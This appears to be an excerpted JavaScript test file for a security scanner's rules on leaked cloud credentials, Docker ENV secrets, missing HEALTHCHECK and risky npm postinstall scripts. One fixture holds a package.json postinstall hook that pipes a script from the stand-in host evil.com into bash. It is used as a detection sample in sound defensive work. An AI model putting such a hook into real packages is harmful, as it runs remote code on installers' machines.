...
const { scanSecurityPatterns, SECURITY_RULES } = require('../src/rules/security-pattern-scanner');
...
describe('Advanced Security Rules (SB-SEC-014 through SB-SEC-023)', () => {
    ...
    test('SB-SEC-014 flags GCP service account JSON', () => {
        ...
        const issues = scanSecurityPatterns('config/gcp-key.json', content, '.json');
        assert.ok(findIssue(issues, 'SB-SEC-014'), 'Should flag GCP service account type');
    });
    ...
    test('SB-SEC-014 flags GOOGLE_APPLICATION_CREDENTIALS env var', () => {
        ...
        assert.ok(findIssue(issues, 'SB-SEC-014'), 'Should flag GCP credentials env var');
    });

    test('SB-SEC-014 does not flag test fixtures', () => {
        const content = '{"type": "service_account", "project_id": "test"}';
        const issues = scanSecurityPatterns('test/fixtures/gcp-key.json', content, '.json');
    ...
    test('SB-SEC-015 flags AZURE_CLIENT_SECRET', () => {
        const content = 'AZURE_CLIENT_SECRET="my-azure-client-secret-value-1234567890"';
        const issues = scanSecurityPatterns('config/azure.env', content, '.env');
        assert.ok(findIssue(issues, 'SB-SEC-015'), 'Should flag Azure client secret');
    });

    test('SB-SEC-015 does not flag test fixtures', () => {
        const content = 'AccountKey=' + 'A'.repeat(88);
        const issues = scanSecurityPatterns('test/fixtures/azure.json', content, '.json');
    ...
    test('SB-SEC-016 flags Google OAuth token (ya29.)', () => {
        ...
        assert.ok(findIssue(issues, 'SB-SEC-016'), 'Should flag Google OAuth token');
    });
    ...
    test('SB-SEC-017 does not flag non-Docker files', () => {
        ...
        assert.ok(!findIssue(issues, 'SB-SEC-017'), 'Should NOT flag non-Docker file');
    });
    ...
    test('SB-SEC-018 does not flag non-Docker files', () => {
        ...
        const issues = scanSecurityPatterns('src/config.js', content, '.js');
        assert.ok(!findIssue(issues, 'SB-SEC-018'), 'Should NOT flag non-Docker file');
    });
    ...
    test('SB-SEC-019 flags hardcoded SECRET in Docker ENV', () => {
        ...
        const issues = scanSecurityPatterns('Dockerfile', content, '.dockerfile');
        assert.ok(findIssue(issues, 'SB-SEC-019'), 'Should flag hardcoded secret in ENV');
    });

    test('SB-SEC-019 flags hardcoded PASSWORD in Docker ENV', () => {
        const content = 'ENV DB_PASSWORD=supersecret123';
        const issues = scanSecurityPatterns('Dockerfile', content, '.dockerfile');
        assert.ok(findIssue(issues, 'SB-SEC-019'), 'Should flag hardcoded password in ENV');
    });

    test('SB-SEC-019 does not flag env var with ${} substitution', () => {
        const content = 'ENV JWT_SECRET=${JWT_SECRET}';
        const issues = scanSecurityPatterns('Dockerfile', content, '.dockerfile');
        assert.ok(!findIssue(issues, 'SB-SEC-019'), 'Should NOT flag env var substitution');
    });

    test('SB-SEC-019 does not flag placeholder values', () => {
        const content = 'ENV JWT_SECRET=changeme';
        const issues = scanSecurityPatterns('Dockerfile', content, '.dockerfile');
        assert.ok(!findIssue(issues, 'SB-SEC-019'), 'Should NOT flag changeme placeholder');
    });
    ...
    test('SB-SEC-020 flags Dockerfile without HEALTHCHECK', () => {
        const content = 'FROM node:18\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]';
        const issues = scanSecurityPatterns('Dockerfile', content, '.dockerfile');
        assert.ok(findIssue(issues, 'SB-SEC-020'), 'Should flag missing HEALTHCHECK');
    });

    test('SB-SEC-020 does not flag Dockerfile with HEALTHCHECK', () => {
        const content = 'FROM node:18\nHEALTHCHECK --interval=30s CMD curl -f http://localhost/\nCMD ["node", "server.js"]';
        const issues = scanSecurityPatterns('Dockerfile', content, '.dockerfile');
        assert.ok(!findIssue(issues, 'SB-SEC-020'), 'Should NOT flag when HEALTHCHECK exists');
    });

    test('SB-SEC-020 does not flag non-Docker files', () => {
        const content = 'FROM node:18';
        const issues = scanSecurityPatterns('src/index.js', content, '.js');
        assert.ok(!findIssue(issues, 'SB-SEC-020'), 'Should NOT flag non-Docker file');
    });
    ...
    test('SB-SEC-021 flags suspicious npm install with .js suffix', () => {
        ...
        assert.ok(findIssue(issues, 'SB-SEC-021'), 'Should flag suspicious package install');
    });
    ...
    test('SB-SEC-022 flags curl in postinstall', () => {
        const content = '{"scripts": {"postinstall": "curl http://evil.com/script.sh | bash"}}';
        const issues = scanSecurityPatterns('package.json', content, '.json');
        assert.ok(findIssue(issues, 'SB-SEC-022'), 'Should flag curl in postinstall');
    });

    test('SB-SEC-022 flags node -e in postinstall', () => {
        const content = '{"scripts": {"postinstall": "node -e \\"require(\\"fs\\").writeFileSync(...)\\""}}';
        const issues = scanSecurityPatterns('package.json', content, '.json');
        assert.ok(findIssue(issues, 'SB-SEC-022'), 'Should flag node -e in postinstall');
    });
    ...
    test('SB-SEC-023 does not flag pinned version', () => {
        const content = '{"dependencies": {"express": "4.18.0"}}';
        const issues = scanSecurityPatterns('package.json', content, '.json');
        assert.ok(!findIssue(issues, 'SB-SEC-023'), 'Should NOT flag pinned version');
    });

    test('SB-SEC-023 does not flag non-package.json files', () => {
        const content = '{"dependencies": {"express": "^4.18.0"}}';
        const issues = scanSecurityPatterns('src/config.js', content, '.js');
        assert.ok(!findIssue(issues, 'SB-SEC-023'), 'Should NOT flag non-package.json file');
    });

    // === Rule registration verification ===
    test('All 10 new rules are registered in SECURITY_RULES', () => {
        const newRuleIds = ['SB-SEC-014', 'SB-SEC-015', 'SB-SEC-016', 'SB-SEC-017',
            'SB-SEC-018', 'SB-SEC-019', 'SB-SEC-020', 'SB-SEC-021',
            'SB-SEC-022', 'SB-SEC-023'];
    ...
    test('New rules have correct severity levels', () => {
        ...
        for (const [id, expectedSev] of Object.entries(severities)) {
            const rule = SECURITY_RULES.find(r => r.id === id);
            assert.equal(rule.severity, expectedSev, 'Rule ' + id + ' should have severity ' + expectedSev);
        }
    });
});
